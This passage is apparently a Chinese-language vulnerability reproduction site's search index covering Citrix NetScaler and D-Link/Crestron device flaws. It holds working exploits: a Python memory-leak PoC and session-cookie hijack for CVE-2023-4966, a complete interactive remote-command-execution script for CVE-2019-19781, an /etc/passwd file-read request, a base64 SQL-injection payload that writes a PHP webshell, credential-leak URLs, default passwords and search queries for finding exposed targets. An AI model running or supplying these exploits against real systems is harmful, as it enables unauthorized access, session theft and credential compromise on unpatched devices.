两个版本进行分析，主要关注其 /netscaler/nsppe 二进制文件的相关补丁，该文件是 NetScaler 数据包处理引擎，它包含完整的 TCP/IP 网络堆栈以及多个 HTTP 服务。 通过分析，最终确定与漏洞相关的函数为：ns_aaa_oauth_send_openid_config和ns_aaa_oauthrp_send_openid_config 更新前后代码的主要差异如下： # 更新前 iVar3 = snprintf(print_temp_rule,0x20000, \"{\\\"issuer\\\": \\\"https://%.*s\\\", \\\"authorization_endpoint\\\": \\\"https://%.*s/oauth/ idp/login\\\", \\\"token_endpoint\\\": \\\"https://%.*s/oauth/idp/token\\\", \\\"jwks_uri\\\": \\\"https://%.*s/oauth/idp/certs\\\", \\\"response_types_supported\\\": [\\\"code\\\", \\\"toke n\\\", \\\"id_token\\\"], \\\"id_token_signing_alg_values_supported\\\": [\\\"RS256\\\"], \\\"end _session_endpoint\\\": \\\"https://%.*s/oauth/idp/logout\\\", \\\"frontchannel_logout_sup ported\\\": true, \\\"scopes_supported\\\": [\\\"openid\\\", \\\"ctxs_cc\\\"], \\\"claims_support ed\\\": [\\\"sub\\\", \\\"iss\\\", \\\"aud\\\", \\\"exp\\\", \\\"iat\\\", \\\"auth_time\\\", \\\"acr\\\", \\\"amr \\\", \\\"email\\\", \\\"given_name\\\", \\\"family_name\\\", \\\"nickname\\\"], \\\"userinfo_endpoin t\\\": \\\"https://%.*s/oauth/idp/userinfo\\\", \\\"subject_types_supported\\\": [\\\"public\\\"]}\" ,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8); authv2_json_resp = 1; iVar3 = ns_vpn_send_response(param_1,0x100040,print_temp_rule,iVar3); # 更新后 uVar7 = snprintf(print_temp_rule,0x20000, \"{\\\"issuer\\\": \\\"https://%.*s\\\", \\\"authorization_endpoint\\\": \\\"https://%.*s/oauth/ idp/login\\\", \\\"token_endpoint\\\": \\\"https://%.*s/oauth/idp/token\\\", \\\"jwks_uri\\\": \\\"https://%.*s/oauth/idp/certs\\\", \\\"response_types_supported\\\": [\\\"code\\\", \\\"toke n\\\", \\\"id_token\\\"], \\\"id_token_signing_alg_values_supported\\\": [\\\"RS256\\\"], \\\"end _session_endpoint\\\": \\\"https://%.*s/oauth/idp/logout\\\", \\\"frontchannel_logout_sup ported\\\": true, \\\"scopes_supported\\\": [\\\"openid\\\", \\\"ctxs_cc\\\"], \\\"claims_support ed\\\": [\\\"sub\\\", \\\"iss\\\", \\\"aud\\\", \\\"exp\\\", \\\"iat\\\", \\\"auth_time\\\", \\\"acr\\\", \\\"amr \\\", \\\"email\\\", \\\"given_name\\\", \\\"family_name\\\", \\\"nickname\\\"], \\\"userinfo_endpoin t\\\": \\\"https://%.*s/oauth/idp/userinfo\\\", \\\"subject_types_supported\\\": [\\\"public\\\"]}\" ,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8,uVar5,pbVar8); uVar4 = 0x20; if (uVar7 \u003c 0x20000) { authv2_json_resp = 1; iVar3 = ns_vpn_send_response(param_1,0x100040,print_temp_rule,uVar7); ... } 该代码段落在访问 /oauth/idp/.well-known/openid-configuration 路由的时候将被调用，其逻辑是通过调用 snprintf()函数构造一个 json 数据并通过 ns_vpn_send_response() 函数形成http response 返回给用户，这个 json 数据中拼接了来自 http 请求的 HOST 字段的数据。 snprintf()函数虽然通过第二个参数限制了 print_temp_rule对应的字符串的最大长度，但是 snprintf()函数的返回值却是 完成 format 之后预期的 字符串的长度，也就是说即使第二个参数为 0x20000 ，snprintf()函数的返回值可以大于 0x20000。 ns_vpn_send_response()函数的第四个参数决定了读取的内存大小，这就意味着 紧跟在 print_temp_rule变量之后的缓冲区中的信息能够被带入 response 当中。 从上面的分析可以想到，攻击者能够在访问 /oauth/idp/.well-known/openid-configuration路由时往 Host字段插入大量数据，从而使得返回的response 中带上缓冲区信息，导致信息泄露。 poc： import requests from urllib.parse import urljoin url = \"https://ip:port\" headers = {\"Host\": \"a\"*24578} try: r = requests.get(urljoin(url,\"/oauth/idp/.well-known/openid-configuration\"), headers=headers, verify=False,timeout=10) print(r.status_code) if len(r.content) \u003e 0: with open(\"resp.txt\",\"wb\") as f: f.write(r.content) except Exception as e: print(e) 在 response 中可能会包含 长度为 65 或 32 的 session cookie ，比如： 5e588bab9a60e4831bc1da8ade46d78b0c3a01c3a45525d5f4f58455e445a4a42 攻击者可以借助该信息无需经过身份验证实现系统的访问： GET /logon/LogonPoint/Authentication/GetUserName HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Cookie: NSC_AAAC=5e588bab9a60e4831bc1da8ade46d78b0c3a01c3a45525d5f4f58455e445a4a42 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close ","date":"0001-01-01","objectID":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/:3:0","tags":null,"title":"","uri":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/"},{"categories":null,"content":"漏洞修复 官方最新版本已修复此漏洞。下载地址为： https://www.citrix.com/downloads/citrix-adc/ ","date":"0001-01-01","objectID":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/:4:0","tags":null,"title":"","uri":"/citrix-netscaler-adc-gateway-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2023-4966/"},{"categories":null,"content":"Citrix 远程命令执行漏洞 CVE-2019-19781 ","date":"0001-01-01","objectID":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/:0:0","tags":null,"title":"","uri":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/"},{"categories":null,"content":"漏洞描述 Citrix ADC（NetScalers）中的目录穿越错误，这个错误会调用perl脚本，perl脚本用于将XML格式的文件附加到受害计算机，因此产生远程执行代码。 ","date":"0001-01-01","objectID":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/:1:0","tags":null,"title":"","uri":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/"},{"categories":null,"content":"漏洞影响 Citrix NetScaler ADC and NetScaler Gateway version 10.5 Citrix ADC and NetScaler Gateway version 11.1 , 12.0 , 12.1 Citrix ADC and Citrix Gateway version 13.0 ","date":"0001-01-01","objectID":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/:2:0","tags":null,"title":"","uri":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/"},{"categories":null,"content":"漏洞复现 访问 https://target-ip 或 http://target-ip登录系统，默认用户和密码登录：nsroot/nsroot。 利用目录穿越写入命令语句到newbm.pl文件中： POST /vpns/portal/scripts/newbm.pl HTTP/1.1 Host: target-ip Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.23.0 NSC_NONCE: nsroot NSC_USER: ../../../netscaler/portal/templates/15ffbdca Content-Length: 89 url=http://example.com\u0026title=15ffbdca\u0026desc=[% template.new('BLOCK' = 'print `whoami`') %] GET方式访问写入的xml文件： GET /vpns/portal/15ffbdca.xml HTTP/1.1 Host: 50.202.211.151 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.23.0 NSC_NONCE: nsroot NSC_USER: nsroot ","date":"0001-01-01","objectID":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/:3:0","tags":null,"title":"","uri":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/"},{"categories":null,"content":"漏洞EXP #!/usr/bin/env python # https://github.com/mpgn/CVE-2019-19781 # # # import requests import string import random import re import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) print(\"CVE-2019-19781 - Remote Code Execution in Citrix Application Delivery Controller and Citrix Gateway\") print(\"Found by Mikhail Klyuchnikov\") print(\"\") if len(sys.argv) \u003c 2: print(\"[-] No URL provided\") sys.exit(0) while True: try: command = input(\"command \u003e \") random_xml = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12)) print(\"[+] Adding bookmark\", random_xml + \".xml\") burp0_url = sys.argv[1] + \"/vpn/../vpns/portal/scripts/newbm.pl\" burp0_headers = {\"NSC_USER\": \"../../../../netscaler/portal/templates/\" + random_xml, \"NSC_NONCE\": \"c\", \"Connection\": \"close\"} burp0_data = {\"url\": \"http://exemple.com\", \"title\": \"[%t=template.new({'BLOCK'='print `\" + str(command) + \"`'})%][ % t % ]\", \"desc\": \"test\", \"UI_inuse\": \"RfWeb\"} r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data,verify=False) if r.status_code == 200: print(\"[+] Bookmark added\") else: print(\"\\n[-] Target not vulnerable or something went wrong\") sys.exit(0) burp0_url = sys.argv[1] + \"/vpns/portal/\" + random_xml + \".xml\" burp0_headers = {\"NSC_USER\": \"../../../../netscaler/portal/templates/\" + random_xml, \"NSC_NONCE\": \"c\", \"Connection\": \"close\"} r = requests.get(burp0_url, headers=burp0_headers,verify=False) replaced = re.sub('^\u0026#.*\u0026#10;$', '', r.text, flags=re.MULTILINE) print(\"[+] Result of the command: \\n\") print(replaced) except KeyboardInterrupt: print(\"Exiting...\") break ","date":"0001-01-01","objectID":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/:4:0","tags":null,"title":"","uri":"/citrix-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-19781/"},{"categories":null,"content":"Crestron aj.html 账号密码泄漏漏洞 CVE-2022-23178 ","date":"0001-01-01","objectID":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/:0:0","tags":null,"title":"","uri":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/"},{"categories":null,"content":"漏洞描述 Crestron HD等系列设备 aj.html页面调用特定的参数可以获取账号密码等敏感信息 ","date":"0001-01-01","objectID":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/:1:0","tags":null,"title":"","uri":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/"},{"categories":null,"content":"漏洞影响 Crestron HD等系列设备 ","date":"0001-01-01","objectID":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/:2:0","tags":null,"title":"","uri":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/"},{"categories":null,"content":"网络测绘 app=\"Crestron-HD-RX-201-C-E\" ","date":"0001-01-01","objectID":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/:3:0","tags":null,"title":"","uri":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/"},{"categories":null,"content":"漏洞复现 POC /aj.html?a=devi ","date":"0001-01-01","objectID":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/:4:0","tags":null,"title":"","uri":"/crestron-aj.html-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2022-23178/"},{"categories":null,"content":"D-Link AC管理系统 默认账号密码 ","date":"0001-01-01","objectID":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/:0:0","tags":null,"title":"","uri":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"},{"categories":null,"content":"漏洞描述 D-Link AC管理系统存在默认账号密码，可被获取敏感信息 ","date":"0001-01-01","objectID":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/:1:0","tags":null,"title":"","uri":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"},{"categories":null,"content":"漏洞影响 D-Link AC管理系统 ","date":"0001-01-01","objectID":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/:2:0","tags":null,"title":"","uri":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"},{"categories":null,"content":"网络测绘 \"AC集中管理平台\" \u0026\u0026 body=\"D-Link路由器管理页\" ","date":"0001-01-01","objectID":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/:3:0","tags":null,"title":"","uri":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"},{"categories":null,"content":"漏洞复现 默认口令为 admin:admin ","date":"0001-01-01","objectID":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/:4:0","tags":null,"title":"","uri":"/d-link-ac%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E9%BB%98%E8%AE%A4%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"},{"categories":null,"content":"D-Link DAP-2020 webproc 任意文件读取漏洞 CVE-2021-27250 ","date":"0001-01-01","objectID":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/:0:0","tags":null,"title":"","uri":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/"},{"categories":null,"content":"漏洞描述 近日D-Link发布公告[1]称旗下产品DAP-2020存在任意文件读取漏洞，CVE编号为CVE-2021-27250，目前已在硬件版本：A1，固件版本：1.01 上测试了PoC，由于漏洞影响核心组件，因此其他版本也可能受到此漏洞的影响 ","date":"0001-01-01","objectID":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/:1:0","tags":null,"title":"","uri":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/"},{"categories":null,"content":"漏洞影响 D-LINK DAP-2020 ","date":"0001-01-01","objectID":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/:2:0","tags":null,"title":"","uri":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/"},{"categories":null,"content":"网络测绘 body=\"DAP-1360\" \u0026\u0026 body=\"6.05\" ","date":"0001-01-01","objectID":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/:3:0","tags":null,"title":"","uri":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC POST /cgi-bin/webproc getpage=html%2Findex.html\u0026errorpage=/etc/passwd\u0026var%3Amenu=setup\u0026var%3Apage=wizard\u0026var%3Alogin=true\u0026obj-action=auth\u0026%3Ausername=admin\u0026%3Apassword=123\u0026%3Aaction=login\u0026%3Asessionid=3c1f7123 ","date":"0001-01-01","objectID":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/:4:0","tags":null,"title":"","uri":"/d-link-dap-2020-webproc-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-27250/"},{"categories":null,"content":"D-Link DAR-8000 importhtml.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 D-Link DAR-8000 importhtml.php文件存在SQL注入导致 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 D-Link DAR-8000 ","date":"0001-01-01","objectID":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"mask.style.visibility\" ","date":"0001-01-01","objectID":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件 importhtml.php \u003c?php include_once(\"global.func.php\"); if($_SESSION['language']!=\"english\") { require_once (\"include/language_cn.php\"); } else { require_once (\"include/language_en.php\"); } if(isset($_GET['type'])) $get_type = $_GET['type']; if(isset($_GET['tab'])) $get_tab = $_GET['tab']; if(isset($_GET['sql'])) $get_sql = $_GET['sql']; if($get_type == \"exporthtmlpost\") { $get_tab = $arr_export_cn[$get_tab]; exportHtml(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlchat\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlChat(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlmail\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlMail(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlwebsend\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlWebSend(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlwebrecv\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlWebRecv(\"$get_tab\",stripslashes(base64_decode($get_sql))); } ?\u003e 跟踪exportHtmlMail函数 function exportHtmlMail($filename,$sql){ Header( \"Expires: 0\" ); Header( \"Pragma: public\" ); Header( \"Cache-Control: must-revalidate, post-check=0, pre-check=0\" ); Header( \"Cache-Control: public\"); Header( \"Content-Type: application/octet-stream\" ); header(\"Accept-Ranges: bytes\"); header(\"Content-Disposition: attachment; filename=$filename.html\"); echo \"\u003chtml\u003e\\n\"; echo \"\u003chead\u003e\u003ctitle\u003e报表\u003c/title\u003e\u003c/head\u003e\\n\"; echo \"\u003cbody\u003e\\n\"; $conn = connOther(); $result = mysql_query($sql,$conn); while ($data= mysql_fetch_array($result)){ $post_content = \"\"; if($data['mail_file_path'] == \"(null)\"){ $post_content = \"\u003cfont color=red\u003e内容审计未启用\u003c/font\u003e\"; } else{ $post_filename=$data['mail_file_path']; $ifother = \"\"; $ifother = ifExistOther($post_filename); if($ifother!=\"\"){ $post_filename = $ifother; } $str = \"/usr/bin/cap2con $post_filename pop\"; system($str,$returnvalue); $post_filename=str_replace(\".cap\",\".eml\",$post_filename); $post_content = file_get_contents($post_filename); $rec=new mime_decode; $post_content=$rec-\u003edecode_mime_string($post_content); //... } } } 这里可以发现通过base64解码后执行的Sql语句结果传入函数exportHtmlMail中调用system执行, 而 $post_filename 可控 $str = \"/usr/bin/cap2con $post_filename pop\"; 验证POC https://xxx.xxx.xxx.xxx/importhtml.php?type=exporthtmlmail\u0026tab=tb_RCtrlLog\u0026sql=c2VsZWN0IDB4M2MzZjcwNjg3MDIwNjU2MzY4NmYyMDczNzk3Mzc0NjU2ZDI4MjQ1ZjUwNGY1MzU0NWIyMjYzNmQ2NDIyNWQyOTNiM2YzZSBpbnRvIG91dGZpbGUgJy91c3IvaGRkb2NzL25zZy9hcHAvc3lzMS5waHAn 访问成功后会触发下载日志文件，再访问 sys1.php ","date":"0001-01-01","objectID":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/d-link-dar-8000-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078 ","date":"0001-01-01","objectID":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/:0:0","tags":null,"title":"","uri":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/"},{"categories":null,"content":"漏洞描述 D-Link DCS系列监控 通过访问特定的URL得到账号密码信息，攻击者通过漏洞进入后台可以获取视频监控页面 ","date":"0001-01-01","objectID":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/:1:0","tags":null,"title":"","uri":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/"},{"categories":null,"content":"漏洞影响 DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703 ","date":"0001-01-01","objectID":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/:2:0","tags":null,"title":"","uri":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/"},{"categories":null,"content":"网络测绘 app=\"D_Link-DCS-2530L\" ","date":"0001-01-01","objectID":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/:3:0","tags":null,"title":"","uri":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/"},{"categories":null,"content":"漏洞复现 访问登录页面如下 出现漏洞的 Url 为, 其中泄露了账号密码 http://xxx.xxx.xxx.xxx/config/getuser?index=0 使用泄露的账号密码登陆系统 ","date":"0001-01-01","objectID":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/:4:0","tags":null,"title":"","uri":"/d-link-dcs%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-25078/"},{"categories":null,"content":"D-Link Dir-645 getcfg.php 账号密码泄露漏洞 CVE-2019-17506 ","date":"0001-01-01","objectID":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/:0:0","tags":null,"title":"","uri":"/d-link-dir-645-getcfg.php-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2019-17506/"},{"categories":null,"content":"漏洞描述 D-Link DIR-868L B1-2.03和DIR-817LW A1-1.04路由器上有一些不需要身份验证的Web界面。攻击者可以通过SERVICES的DEVICE.ACCOUNT值以及AUTHORIZED_GROUP = 1％0a来获取getcfg.php的路由器的用户名和密码（以及其他信息）。这可用于远程控制路由器 